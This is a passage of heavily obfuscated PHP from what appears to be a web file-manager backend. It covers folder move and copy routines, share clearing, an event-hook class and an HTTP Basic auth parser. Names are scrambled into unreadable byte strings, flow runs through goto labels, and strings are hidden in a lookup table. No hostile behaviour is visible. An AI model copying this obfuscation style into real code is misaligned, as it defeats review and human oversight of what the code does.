$this->lockMoveStart($b´‡Ó…é¥); goto BÑÍ¼®Š«; BÑÍ¼®Š«: $this->lockWriteStart($a ÌŠäÕİ, $CÏ×Û·³Š); if (!$A…»ĞÇô³) { return $this->_moveForce($b´‡Ó…é¥, $a ÌŠäÕİ, $CÏ×Û·³Š); } $B³÷’ãÙ³ª = $A…»ĞÇô³; goto bÊš”´Û÷”; bÊš”´Û÷”: $Dïø ”àŞ´ = !1; if ($Aí·åÒŒöø) { if ($E‹®ğ…³Â == REPEAT_RENAME_FOLDER) { $CÏ×Û·³Š = $this->fileNameAuto($a ÌŠäÕİ, $CÏ×Û·³Š, $E‹®ğ…³Â, $Aí·åÒŒöø); $B³÷’ãÙ³ª = $this->_moveForce($b´‡Ó…é¥, $a ÌŠäÕİ, $CÏ×Û·³Š); } else { if ($E‹®ğ…³Â == REPEAT_RENAME_FOLDER) { $E‹®ğ…³Â = REPEAT_RENAME; } $E†‹à®‡Ò = $this->_childrenListSelect($b´‡Ó…é¥); foreach ($E†‹à®‡Ò as $D²øÈ´É§ó) { $this->_move($D²øÈ´É§ó[$cºÄƒœåÆ›[366]], $A…»ĞÇô³, $E‹®ğ…³Â, $cÇ«÷¦ƒÖÜ); } $Dïø ”àŞ´ = !0; } } else { if ($E‹®ğ…³Â == REPEAT_SKIP) { $Dïø ”àŞ´ = !0; } else { if ($E‹®ğ…³Â == REPEAT_RENAME || $E‹®ğ…³Â == REPEAT_RENAME_FOLDER) { $CÏ×Û·³Š = $this->fileNameAuto($a ÌŠäÕİ, $CÏ×Û·³Š, $E‹®ğ…³Â, $Aí·åÒŒöø); $B³÷’ãÙ³ª = $this->_moveForce($b´‡Ó…é¥, $a ÌŠäÕİ, $CÏ×Û·³Š); } else { if ($E‹®ğ…³Â == REPEAT_REPLACE) { $CİäÉĞØŞ = $this->sourceInfoCache($A…»ĞÇô³); $fí·¿›ÃÓÊ = $this->fileHistory($CİäÉĞØŞ, $BÓ”÷á„á[$cºÄƒœåÆ›[415]], $BÓ”÷á„á[$cºÄƒœåÆ›[77]]); if ($fí·¿›ÃÓÊ) { $cÇ«÷¦ƒÖÜ[$cºÄƒœåÆ›[497]][] = $BÓ”÷á„á[$cºÄƒœåÆ›[415]]; } else { $Dïø ”àŞ´ = !0; } } } } } if ($Dïø ”àŞ´ && !$cÇ«÷¦ƒÖÜ[$cºÄƒœåÆ›[529]]) { $cÇ«÷¦ƒÖÜ[$cºÄƒœåÆ›[529]] = !0; } goto D‰© ‘¿Ğ; FÙù‘«‚‚†: $cºÄƒœåÆ› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÓ”÷á„á = $this->sourceInfo($b´‡Ó…é¥); $Aí·åÒŒöø = $BÓ”÷á„á[$cºÄƒœåÆ›[367]] == $cºÄƒœåÆ›[83]; goto b‚ãÙÔ™İ¯; D‰© ‘¿Ğ: return $B³÷’ãÙ³ª; goto DÌÙ„ˆì; DÌÙ„ˆì: } private function _moveForce($CäÓ…ÛÕÇö, $D‚¡½à¡±, $Dä©İÔÃ—) { goto Cëö‰ÔËá…; FÎÖœóï–‹: $d†áÖ¨Œ = $F‰šï¡ƒß¡[$d¯«›Œç×Ù[367]] == $d¯«›Œç×Ù[83]; $d… ï‘é¤‚ = array($d¯«›Œç×Ù[365] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[366]], $d¯«›Œç×Ù[521] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[455]] . $BåÑİµ“¶¾[$d¯«›Œç×Ù[366]] . $d¯«›Œç×Ù[47], $d¯«›Œç×Ù[517] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[368]], $d¯«›Œç×Ù[518] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[452]], $d¯«›Œç×Ù[520] => USER_ID, $d¯«›Œç×Ù[383] => $Dä©İÔÃ—); $FÉÊÃ¹ºìî = $F‰šï¡ƒß¡[$d¯«›Œç×Ù[368]] == SourceModel::TYPE_GROUP && $BåÑİµ“¶¾[$d¯«›Œç×Ù[368]] == SourceModel::TYPE_GROUP && $F‰šï¡ƒß¡[$d¯«›Œç×Ù[452]] == $BåÑİµ“¶¾[$d¯«›Œç×Ù[452]]; goto Eâ¿°ëŠ³; Eâ¿°ëŠ³: if (!$FÉÊÃ¹ºìî) { Model($d¯«›Œç×Ù[450])->authClear($CäÓ…ÛÕÇö); } $bÈåù‡¸ŒÄ = $F‰šï¡ƒß¡[$d¯«›Œç×Ù[393]] == $d¯«›Œç×Ù[83] && $BåÑİµ“¶¾[$d¯«›Œç×Ù[393]] != $d¯«›Œç×Ù[83]; if ($bÈåù‡¸ŒÄ) { $d… ï‘é¤‚[$d¯«›Œç×Ù[392]] = 0; } goto A²Ì…íàß‘; Cëö‰ÔËá…: $d¯«›Œç×Ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‰šï¡ƒß¡ = $this->sourceInfo($CäÓ…ÛÕÇö); $BåÑİµ“¶¾ = $this->sourceInfo($D‚¡½à¡±); goto FÎÖœóï–‹; A²Ì…íàß‘: if ($d†áÖ¨Œ) { $b„¼–¦­´ = array($d¯«›Œç×Ù[521] => array($d¯«›Œç×Ù[479], $F‰šï¡ƒß¡[$d¯«›Œç×Ù[455]] . $F‰šï¡ƒß¡[$d¯«›Œç×Ù[366]] . $d¯«›Œç×Ù[480])); $cÅ¸¢›Ú†× = $F‰šï¡ƒß¡[$d¯«›Œç×Ù[455]] . $F‰šï¡ƒß¡[$d¯«›Œç×Ù[366]] . $d¯«›Œç×Ù[47]; $e³×Ùó²ğñ = $BåÑİµ“¶¾[$d¯«›Œç×Ù[455]] . $BåÑİµ“¶¾[$d¯«›Œç×Ù[366]] . $d¯«›Œç×Ù[47] . $F‰šï¡ƒß¡[$d¯«›Œç×Ù[366]] . $d¯«›Œç×Ù[47]; $bÃÅÚõŒ‘ = array($d¯«›Œç×Ù[521] => array($d¯«›Œç×Ù[530], "\x72\145\160\x6c\x61\x63\145\x28\x70\141\x72\x65\x6e\x74\114\x65\x76\x65\154\54\47{$cÅ¸¢›Ú†×}\x27\54\47{$e³×Ùó²ğñ}\47\51"), $d¯«›Œç×Ù[517] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[368]], $d¯«›Œç×Ù[518] => $BåÑİµ“¶¾[$d¯«›Œç×Ù[452]]); if ($bÈåù‡¸ŒÄ) { $bÃÅÚõŒ‘[$d¯«›Œç×Ù[392]] = 0; } $this->where($b„¼–¦­´)->data($bÃÅÚõŒ‘)->save(); } $this->where(array($d¯«›Œç×Ù[380] => $CäÓ…ÛÕÇö))->data($d… ï‘é¤‚)->save(); return $CäÓ…ÛÕÇö; goto fâÁ›•ê; fâÁ›•ê: } private function clearShare($AˆàÈÑŒÙ´, $c×Ã‚–¦ŸÉ) { goto CîâÕ§¹Šª; bá–ù‡öÇ¯: if (!$F¶ÎèÓñö) { return; } $cƒ„ìƒÓ‡ = array($C¿‰ğóÆçƒ[366] => array($C¿‰ğóÆçƒ[7], $F¶ÎèÓñö), $C¿‰ğóÆçƒ[444] => 1); $fÃ«ä‚˜œñ = Model($C¿‰ğóÆçƒ[532])->field($C¿‰ğóÆçƒ[437])->where($cƒ„ìƒÓ‡)->select(); goto d®Š¨Ôõƒ; CîâÕ§¹Šª: $C¿‰ğóÆçƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f§œÈñÅÆø = $this->sourceInfo($AˆàÈÑŒÙ´); $dˆñóùÊğá = $this->sourceInfo($c×Ã‚–¦ŸÉ); goto f†Ïùğã¢; d®Š¨Ôõƒ: if (!$fÃ«ä‚˜œñ) { return; } $fÃ«ä‚˜œñ = array_to_keyvalue($fÃ«ä‚˜œñ, $C¿‰ğóÆçƒ[33], $C¿‰ğóÆçƒ[437]); $cƒ„ìƒÓ‡ = array($C¿‰ğóÆçƒ[437] => array($C¿‰ğóÆçƒ[7], $fÃ«ä‚˜œñ)); goto A¢®† ò Ç; f†Ïùğã¢: if ($f§œÈñÅÆø[$C¿‰ğóÆçƒ[452]] == $dˆñóùÊğá[$C¿‰ğóÆçƒ[452]] && $f§œÈñÅÆø[$C¿‰ğóÆçƒ[368]] == $C¿‰ğóÆçƒ[531]) { return; } $cƒ„ìƒÓ‡ = array($C¿‰ğóÆçƒ[455] => array($C¿‰ğóÆçƒ[479], $f§œÈñÅÆø[$C¿‰ğóÆçƒ[455]] . $AˆàÈÑŒÙ´ . $C¿‰ğóÆçƒ[480])); $F¶ÎèÓñö = $this->field($C¿‰ğóÆçƒ[380])->where($cƒ„ìƒÓ‡)->getField($C¿‰ğóÆçƒ[366], !0); goto bá–ù‡öÇ¯; A¢®† ò Ç: Model($C¿‰ğóÆçƒ[532])->where($cƒ„ìƒÓ‡)->save(array($C¿‰ğóÆçƒ[444] => 0)); Model($C¿‰ğóÆçƒ[533])->where($cƒ„ìƒÓ‡)->delete(); goto bî½„Ä•ï·; bî½„Ä•ï·: } public function copyFolderFromIO($Bäâ‹Š¼·“, $e’ÜÕ‹½ëˆ, $dÖÖÀÑİ“Â, $eŠÃ“Ë¨÷Ó, $a¥÷ÉĞÆâ, $DÏìê¦ù»¯ = false) { goto E˜§ê¢æ; Fßàâ¹á”: Model($F‚§÷ŠÜî[418])->linkAdd($døÏ…Ó‡¹¼[$F‚§÷ŠÜî[497]]); Model($F‚§÷ŠÜî[418])->remove($døÏ…Ó‡¹¼[$F‚§÷ŠÜî[534]]); $this->folderSizeReset($dÖÖÀÑİ“Â); goto aõ¯‰ Æ¸‚; a©ùÀÛ²ì: Hook::trigger($F‚§÷ŠÜî[536]); if ($eŞÕÅ™ÍÍ×) { $this->folderSizeResetChildren($eŞÕÅ™ÍÍ×); } $this->_childrenListClear(); goto dã²“´õ ; E˜§ê¢æ: $F‚§÷ŠÜî =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $døÏ…Ó‡¹¼ = array($F‚§÷ŠÜî[498] => array(), $F‚§÷ŠÜî[499] => array(), $F‚§÷ŠÜî[497] => array(), $F‚§÷ŠÜî[534] => array()); $c”¤×ŸÖæ = $DÏìê¦ù»¯ ? $DÏìê¦ù»¯ : $Bäâ‹Š¼·“->getPathName($Bäâ‹Š¼·“->pathThis($e’ÜÕ‹½ëˆ)); goto A—Şò®ñƒ; A—Şò®ñƒ: $C‘ÊñÈç° = $this->fileNameExist($dÖÖÀÑİ“Â, $c”¤×ŸÖæ); $eŞÕÅ™ÍÍ× = $this->mkdir($dÖÖÀÑİ“Â, $c”¤×ŸÖæ, $eŠÃ“Ë¨÷Ó); if (!$C‘ÊñÈç° || $eŠÃ“Ë¨÷Ó == REPEAT_RENAME_FOLDER) { $eŠÃ“Ë¨÷Ó = !1; } goto fÚ¹ «ª³¶; aõ¯‰ Æ¸‚: $this->updateModifyTime($dÖÖÀÑİ“Â); return $eŞÕÅ™ÍÍ×; goto Aè™í‘‚‘“; dã²“´õ : Model($F‚§÷ŠÜî[500])->addAll($døÏ…Ó‡¹¼[$F‚§÷ŠÜî[498]], array(), !0); Model($F‚§÷ŠÜî[501])->eventCopy($eŞÕÅ™ÍÍ×); $this->saveAll($døÏ…Ó‡¹¼[$F‚§÷ŠÜî[499]]); goto Fßàâ¹á”; fÚ¹ «ª³¶: if ($C‘ÊñÈç°) { $this->_childrenAllMake($C‘ÊñÈç°); } Hook::trigger($F‚§÷ŠÜî[535]); $this->_copyChildTo($Bäâ‹Š¼·“, $e’ÜÕ‹½ëˆ, $eŞÕÅ™ÍÍ×, $eŠÃ“Ë¨÷Ó, $døÏ…Ó‡¹¼, $a¥÷ÉĞÆâ); goto a©ùÀÛ²ì; Aè™í‘‚‘“: } private function _copyChildTo($FÅÊíÓÅß, $aÊÛŠ‡ÔøÖ, $Dµ‘§ˆÏ”Á, $e˜´é³’•Ø, &$b¢’ÓŸñùò, $E‰…œãĞÑ) { goto B—ˆß‚ãˆ’; fß‚’©èÖ¬: $D©ŒôÈÃŠ´ = $this->_childrenList($Dµ‘§ˆÏ”Á); $D©ŒôÈÃŠ´ = array_to_keyvalue($D©ŒôÈÃŠ´, $bá×›î‡ŒÖ[28]); foreach ($E®ì“ªİÖñ as $C¨ˆŞ·) { $c·ğµÍ¡§Ú = $D©ŒôÈÃŠ´[$C¨ˆŞ·[$bá×›î‡ŒÖ[28]]]; $Cˆº„Ì½”ø = $c·ğµÍ¡§Ú[$bá×›î‡ŒÖ[366]]; $this->_copyApplyMeta($c·ğµÍ¡§Ú, $b¢’ÓŸñùò); if ($C¨ˆŞ·[$bá×›î‡ŒÖ[29]] == $bá×›î‡ŒÖ[76]) { $C¨ˆŞ·[$bá×›î‡ŒÖ[75]] = $FÅÊíÓÅß->getPathInner($C¨ˆŞ·[$bá×›î‡ŒÖ[75]]); $this->_copyChildTo($FÅÊíÓÅß, $C¨ˆŞ·[$bá×›î‡ŒÖ[75]], $Cˆº„Ì½”ø, $e˜´é³’•Ø, $b¢’ÓŸñùò, $E‰…œãĞÑ); } } goto F ¡­²³‹²; d°ÑŠ«‹¥Ø: $E®ì“ªİÖñ = array_merge($BÀØ”»é–[$bá×›î‡ŒÖ[73]], $BÀØ”»é–[$bá×›î‡ŒÖ[74]]); $BòÎ·§Ì±ˆ = $this->_addFiles($FÅÊíÓÅß, $BÀØ”»é–[$bá×›î‡ŒÖ[73]], $E‰…œãĞÑ); $eŒº°¤á— = array(); goto Eñ ®¶ƒ¤; B—ˆß‚ãˆ’: $bá×›î‡ŒÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bóÉê¸ò¥ò = $this->sourceInfoCache($Dµ‘§ˆÏ”Á); $BÀØ”»é– = $FÅÊíÓÅß->listPath($aÊÛŠ‡ÔøÖ, !1, !0); goto d°ÑŠ«‹¥Ø; Eñ ®¶ƒ¤: foreach ($E®ì“ªİÖñ as &$C¨ˆŞ·) { goto DÂİÚ…¿„Í; e×¹á”ˆ…ª: $C¨ˆŞ·[$bá×›î‡ŒÖ[77]] = _get($C¨ˆŞ·, $bá×›î‡ŒÖ[77], 0); $C¨ˆŞ·[$bá×›î‡ŒÖ[415]] = _get($C¨ˆŞ·, $bá×›î‡ŒÖ[415], 0); if (!isset($C¨ˆŞ·[$bá×›î‡ŒÖ[537]]) && $C¨ˆŞ·[$bá×›î‡ŒÖ[415]]) { $b¢’ÓŸñùò[$bá×›î‡ŒÖ[534]][] = $C¨ˆŞ·[$bá×›î‡ŒÖ[415]]; } goto A×ñ§˜ï’Œ; DÂİÚ…¿„Í: if (isset($BòÎ·§Ì±ˆ[$C¨ˆŞ·[$bá×›î‡ŒÖ[28]]])) { $C¨ˆŞ· = $BòÎ·§Ì±ˆ[$C¨ˆŞ·[$bá×›î‡ŒÖ[28]]]; } $C¨ˆŞ·[$bá×›î‡ŒÖ[367]] = $C¨ˆŞ·[$bá×›î‡ŒÖ[29]] == $bá×›î‡ŒÖ[76]; $C¨ˆŞ·[$bá×›î‡ŒÖ[369]] = _get($C¨ˆŞ·, $bá×›î‡ŒÖ[157], $bá×›î‡ŒÖ[33]); goto e×¹á”ˆ…ª; A×ñ§˜ï’Œ: if ($e˜´é³’•Ø) { $C¥ÎÜÓ˜» = $this->fileNameExistCache($Dµ‘§ˆÏ”Á, $C¨ˆŞ·[$bá×›î‡ŒÖ[28]]); if ($C¥ÎÜÓ˜») { if ($C¨ˆŞ·[$bá×›î‡ŒÖ[367]] || $e˜´é³’•Ø == REPEAT_SKIP) { continue; } if ($e˜´é³’•Ø == REPEAT_REPLACE) { $c·ğµÍ¡§Ú = $this->sourceInfoCache($C¥ÎÜÓ˜»); $EâŠÏ šõÊ = $this->fileHistory($c·ğµÍ¡§Ú, $C¨ˆŞ·[$bá×›î‡ŒÖ[415]], $C¨ˆŞ·[$bá×›î‡ŒÖ[77]]); if ($EâŠÏ šõÊ) { $b¢’ÓŸñùò[$bá×›î‡ŒÖ[497]][] = $C¨ˆŞ·[$bá×›î‡ŒÖ[415]]; } continue; } else { if ($e˜´é³’•Ø == REPEAT_RENAME) { $C¨ˆŞ·[$bá×›î‡ŒÖ[28]] = $this->fileNameAutoCache($Dµ‘§ˆÏ”Á, $C¨ˆŞ·[$bá×›î‡ŒÖ[28]], $e˜´é³’•Ø, !1); } } } } if (!$C¨ˆŞ·[$bá×›î‡ŒÖ[367]] && $C¨ˆŞ·[$bá×›î‡ŒÖ[415]]) { $b¢’ÓŸñùò[$bá×›î‡ŒÖ[497]][] = $C¨ˆŞ·[$bá×›î‡ŒÖ[415]]; } $eŒº°¤á—[] = $this->_makeItemData($C¨ˆŞ·, $bóÉê¸ò¥ò, $C¨ˆŞ·[$bá×›î‡ŒÖ[28]]); goto aÂÃí™ßÇ; aÂÃí™ßÇ: } unset($C¨ˆŞ·); if (!empty($eŒº°¤á—)) { $this->addAll($eŒº°¤á—); } goto fß‚’©èÖ¬; F ¡­²³‹²: } private function _addFiles($DÛ­æ®”‰†, $aÓ¼ÉŞÌÍ¡, $eğïÂÉòİ·) { goto C¤éÎè‡¸Ì; e‰ß¢¦ï•ª: return $A¡ÔÖ‡ª; goto eƒì Íµ»Ç; BöğšÑîÔ•: $a¬Ô´Ó• = array($cÖÍÃËâê[160] => array($cÖÍÃËâê[7], array_keys($DŒÇØµë“ä))); $FÀó‹¤¦‰ï = $F”Ÿ±Ü->where($a¬Ô´Ó•)->select(); $FÀó‹¤¦‰ï = $FÀó‹¤¦‰ï ? $FÀó‹¤¦‰ï : array(); goto EÔ¯¡ï‚ùï; f’¿Ôì—È: $A¦‰‹Öñ¤ = array(); foreach ($aÓ¼ÉŞÌÍ¡ as $F”¯…–Ïá) { if (isset($F”¯…–Ïá[$cÖÍÃËâê[537]]) && $F”¯…–Ïá[$cÖÍÃËâê[537]]) { continue; } $FòìÑ÷£–Ë = $DÛ­æ®”‰†->getPathInner($F”¯…–Ïá[$cÖÍÃËâê[75]]); $AŸã„Èò¶ = $F”Ÿ±Ü->addFileMake($FòìÑ÷£–Ë, $F”¯…–Ïá[$cÖÍÃËâê[77]], $F”¯…–Ïá[$cÖÍÃËâê[161]], $F”¯…–Ïá[$cÖÍÃËâê[160]], $F”¯…–Ïá[$cÖÍÃËâê[28]], $eğïÂÉòİ·); $A¦‰‹Öñ¤[] = $AŸã„Èò¶; } $F”Ÿ±Ü->addAll($A¦‰‹Öñ¤); goto BöğšÑîÔ•; e˜ï¤®•Û„: foreach ($aÓ¼ÉŞÌÍ¡ as &$b×áêñŞâ) { goto F¨¬‘Ùğ; FËèç¨ñØƒ: $bÚ’ŠÎçÌ• = $DÛ­æ®”‰†->hashMd5($b×áêñŞâ[$cÖÍÃËâê[75]]); if (strlen($bÚ’ŠÎçÌ•) > 10 && !isset($DŒÇØµë“ä[$bÚ’ŠÎçÌ•])) { $DŒÇØµë“ä[$bÚ’ŠÎçÌ•] = array(); } $b×áêñŞâ[$cÖÍÃËâê[161]] = $C—ÕÌ¹¸»Š; goto dßó…÷©; bƒ°¸İ“: if (count($DŒÇØµë“ä[$bÚ’ŠÎçÌ•]) > 1) { $b×áêñŞâ[$cÖÍÃËâê[537]] = !0; } goto a‰½¶¥ÎÄÄ; F¨¬‘Ùğ: Hook::trigger($cÖÍÃËâê[538], $b×áêñŞâ); $b×áêñŞâ[$cÖÍÃËâê[75]] = $DÛ­æ®”‰†->getPathInner($b×áêñŞâ[$cÖÍÃËâê[75]]); $C—ÕÌ¹¸»Š = $DÛ­æ®”‰†->hashSimple($b×áêñŞâ[$cÖÍÃËâê[75]]); goto FËèç¨ñØƒ; dßó…÷©: $b×áêñŞâ[$cÖÍÃËâê[160]] = $bÚ’ŠÎçÌ•; Hook::trigger($cÖÍÃËâê[539], $b×áêñŞâ); $DŒÇØµë“ä[$bÚ’ŠÎçÌ•][] =& $b×áêñŞâ; goto bƒ°¸İ“; a‰½¶¥ÎÄÄ: } $a¬Ô´Ó• = array($cÖÍÃËâê[160] => array($cÖÍÃËâê[7], array_keys($DŒÇØµë“ä))); $F”Ÿ±Ü = Model($cÖÍÃËâê[540]); goto DİÉïÊÕÈË; C¤éÎè‡¸Ì: $cÖÍÃËâê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$aÓ¼ÉŞÌÍ¡ || count($aÓ¼ÉŞÌÍ¡) == 0) { return array(); } $DŒÇØµë“ä = array(); goto e˜ï¤®•Û„; DİÉïÊÕÈË: $FÀó‹¤¦‰ï = $F”Ÿ±Ü->where($a¬Ô´Ó•)->select(); $FÀó‹¤¦‰ï = $FÀó‹¤¦‰ï ? $FÀó‹¤¦‰ï : array(); foreach ($FÀó‹¤¦‰ï as $F‚æß”’Œ„) { if (!isset($DŒÇØµë“ä[$F‚æß”’Œ„[$cÖÍÃËâê[160]]])) { continue; } $C°é§ğâ¾ñ = $DŒÇØµë“ä[$F‚æß”’Œ„[$cÖÍÃËâê[160]]]; foreach ($C°é§ğâ¾ñ as &$b×áêñŞâ) { $b×áêñŞâ[$cÖÍÃËâê[415]] = $F‚æß”’Œ„[$cÖÍÃËâê[415]]; $b×áêñŞâ[$cÖÍÃËâê[537]] = !0; } unset($b×áêñŞâ); } goto f’¿Ôì—È; EÔ¯¡ï‚ùï: foreach ($FÀó‹¤¦‰ï as $F‚æß”’Œ„) { if (!isset($DŒÇØµë“ä[$F‚æß”’Œ„[$cÖÍÃËâê[160]]])) { continue; } $FØáîÀò“é =& $DŒÇØµë“ä[$F‚æß”’Œ„[$cÖÍÃËâê[160]]]; foreach ($FØáîÀò“é as &$b×áêñŞâ) { $b×áêñŞâ[$cÖÍÃËâê[415]] = $F‚æß”’Œ„[$cÖÍÃËâê[415]]; } unset($b×áêñŞâ); } $A¡ÔÖ‡ª = array(); foreach ($aÓ¼ÉŞÌÍ¡ as $aÈö¸‹Ü¿ù) { $A¡ÔÖ‡ª[$aÈö¸‹Ü¿ù[$cÖÍÃËâê[28]]] = $aÈö¸‹Ü¿ù; } goto e‰ß¢¦ï•ª; eƒì Íµ»Ç: } } define($_SERVER[ÚŠ•´ÍéÒÑÔ][541], $_SERVER[ÚŠ•´ÍéÒÑÔ][542]); goto añ‹ƒÔÈ»; b©Û“§»îÂ: class Hook { private static $events = array(); public static function get($Bõó‘°ÄÍÜ = false) { if (!$Bõó‘°ÄÍÜ) { return self::$events; } else { return self::$events[$Bõó‘°ÄÍÜ]; } } public static function apply($C£óÂÀ¾å¿, $eèÅ·òˆŠ = array()) { $D»•ÀÂÍ© = ActionApply($C£óÂÀ¾å¿, $eèÅ·òˆŠ); if (is_string($C£óÂÀ¾å¿)) { Hook::trigger($C£óÂÀ¾å¿); } return $D»•ÀÂÍ©; } public static function bind($eÇ¡øÒ˜¹¨, $aÈ—¯ùÕ£¯, $Bï¼Ï¿ƒ£ = false) { $C«ÎÌÃ©Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset(self::$events[$eÇ¡øÒ˜¹¨])) { self::$events[$eÇ¡øÒ˜¹¨] = array(); } self::$events[$eÇ¡øÒ˜¹¨][] = array($C«ÎÌÃ©Ø[1719] => $aÈ—¯ùÕ£¯, $C«ÎÌÃ©Ø[1720] => $Bï¼Ï¿ƒ£, $C«ÎÌÃ©Ø[1721] => 0); } public static function once($a´ÈöÎÙ±½, $Bé››¢¸ê) { self::bind($a´ÈöÎÙ±½, $Bé››¢¸ê, !0); } public static function unbind($dœ¤‰šàß, $B­Æº“êº = false) { if (!$B­Æº“êº) { self::$events[$dœ¤‰šàß] = array(); return; } $c³ø¬‚“Ó¿ = self::$events[$dœ¤‰šàß]; self::$events[$dœ¤‰šàß] = array(); if (!is_array($c³ø¬‚“Ó¿)) { return; } for ($BŠ¦®õå’ = 0; $BŠ¦®õå’ < count($c³ø¬‚“Ó¿); $BŠ¦®õå’++) { if ($c³ø¬‚“Ó¿[$BŠ¦®õå’][$_SERVER[ÚŠ•´ÍéÒÑÔ][1719]] == $B­Æº“êº) { continue; } self::$events[$dœ¤‰šàß][] = $c³ø¬‚“Ó¿[$BŠ¦®õå’]; } } public static function filter($DµÛö¯„‡Ú, $c…‘ˆÀà”ë) { goto FŠ²÷µ¤; FŠ²÷µ¤: $bå¨‚Ï¨°„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C¯œêåÉº = self::$events; if (!isset($C¯œêåÉº[$DµÛö¯„‡Ú])) { return $c…‘ˆÀà”ë; } goto FÖ®³ïò; FÖ®³ïò: $cÇ°ğ±à¼ = $C¯œêåÉº[$DµÛö¯„‡Ú]; $b½…Ü˜®éë = $c…‘ˆÀà”ë; if (!is_array($cÇ°ğ±à¼) || count($cÇ°ğ±à¼) == 0) { return $b½…Ü˜®éë; } goto aÜøáŸï; aÜøáŸï: for ($Føß›‰’šµ = 0; $Føß›‰’šµ < count($cÇ°ğ±à¼); $Føß›‰’šµ++) { $aÎ¶„ƒ’“‹ = $cÇ°ğ±à¼[$Føß›‰’šµ]; if ($aÎ¶„ƒ’“‹[$bå¨‚Ï¨°„[1720]] && $aÎ¶„ƒ’“‹[$bå¨‚Ï¨°„[1721]] > 1) { continue; } self::$events[$DµÛö¯„‡Ú][$Føß›‰’šµ][$bå¨‚Ï¨°„[1721]] = $aÎ¶„ƒ’“‹[$bå¨‚Ï¨°„[1721]] + 1; $d®ÊâÜ‡¡ = self::apply($aÎ¶„ƒ’“‹[$bå¨‚Ï¨°„[1719]], array($b½…Ü˜®éë)); if (!is_null($d®ÊâÜ‡¡)) { $b½…Ü˜®éë = $d®ÊâÜ‡¡; } } return $b½…Ü˜®éë; goto Eóî¸¢¨ƒ; Eóî¸¢¨ƒ: } public static function trigger($B·†Öòåâ‘) { goto a°°çÆÙ¬; eÒßğÀö‘Û: return $a‹Œñìè–³; goto f‹Ë¬ìöæŞ; a¢†óğÛŞÒ: if (!isset($cÂ§Áøóá[$B·†Öòåâ‘])) { return $a‹Œñìè–³; } $eßÁ“å™öÎ = $cÂ§Áøóá[$B·†Öòåâ‘]; if (!is_array($eßÁ“å™öÎ) || count($eßÁ“å™öÎ) == 0) { return $a‹Œñìè–³; } goto Ağê³Š‚Ëµ; Ağê³Š‚Ëµ: $BœŠ·ØÄÇÙ = func_get_args(); array_shift($BœŠ·ØÄÇÙ); for ($eí¤¯§±¸ = 0; $eí¤¯§±¸ < count($eßÁ“å™öÎ); $eí¤¯§±¸++) { $b¼ë’ĞÑÕÃ = $eßÁ“å™öÎ[$eí¤¯§±¸]; if ($b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1720]] && $b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1721]] > 1) { continue; } if (defined($EÆã‹êÊ‹ˆ[1722]) && GLOBAL_LOG_HOOK) { write_log($B·†Öòåâ‘ . $EÆã‹êÊ‹ˆ[1723] . $b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1719]], $EÆã‹êÊ‹ˆ[1724]); } self::$events[$B·†Öòåâ‘][$eí¤¯§±¸][$EÆã‹êÊ‹ˆ[1721]] = $b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1721]] + 1; $EîÛñ´ù„ = self::apply($b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1719]], $BœŠ·ØÄÇÙ); if (defined($EÆã‹êÊ‹ˆ[1722]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $EÆã‹êÊ‹ˆ[1724]); if ($b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1721]] == 200) { $eîğ¶À‰â´ = is_array($b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1719]]) ? json_encode_force($b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1719]]) : $b¼ë’ĞÑÕÃ[$EÆã‹êÊ‹ˆ[1719]]; write_log($EÆã‹êÊ‹ˆ[1725] . $B·†Öòåâ‘ . $EÆã‹êÊ‹ˆ[1726] . $eîğ¶À‰â´, $EÆã‹êÊ‹ˆ[1727]); } } $a‹Œñìè–³ = is_null($EîÛñ´ù„) ? $a‹Œñìè–³ : $EîÛñ´ù„; } goto eÒßğÀö‘Û; a°°çÆÙ¬: $EÆã‹êÊ‹ˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÂ§Áøóá = self::$events; $a‹Œñìè–³ = !1; goto a¢†óğÛŞÒ; f‹Ë¬ìöæŞ: } } class HttpAuth { public static function get() { $AÀéßåä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b¢¹éˆ“§ = $AÀéßåä[33]; $a‘ĞÏŒÜÁâ = $AÀéßåä[33]; if (isset($_SERVER[$AÀéßåä[1728]])) { $b¢¹éˆ“§ = $_SERVER[$AÀéßåä[1728]]; $a‘ĞÏŒÜÁâ = $_SERVER[$AÀéßåä[1729]]; } elseif (isset($_SERVER[$AÀéßåä[1730]])) { $eñÁôº´ = $_SERVER[$AÀéßåä[1730]]; if (strpos(strtolower($eñÁôº´), $AÀéßåä[1731]) === 0) { $aİ¤±“¯ˆ = explode($AÀéßåä[4], base64_decode(substr($eñÁôº´, 6))); $b¢¹éˆ“§ = isset($aİ¤±“¯ˆ[0]) ? $aİ¤±“¯ˆ[0] : $AÀéßåä[33]; $a‘ĞÏŒÜÁâ = isset($aİ¤±“¯ˆ[1]) ? $aİ¤±“¯ˆ[1] : 0; } } return array($AÀéßåä[531] => $b¢¹éˆ“§, $AÀéßåä[891] => $a‘ĞÏŒÜÁâ); } public static function error() { goto Fç‰±ùƒ•£; c‚»µö: header($Aƒ¢„ï±Ë[1734]); header($Aƒ¢„ï±Ë[1735]); header($Aƒ¢„ï±Ë[1250]); goto e¶œö–Å“; e¶œö–Å“: die; goto C„ôÈõÆÏ³; Fç‰±ùƒ•£: $Aƒ¢„ï±Ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; 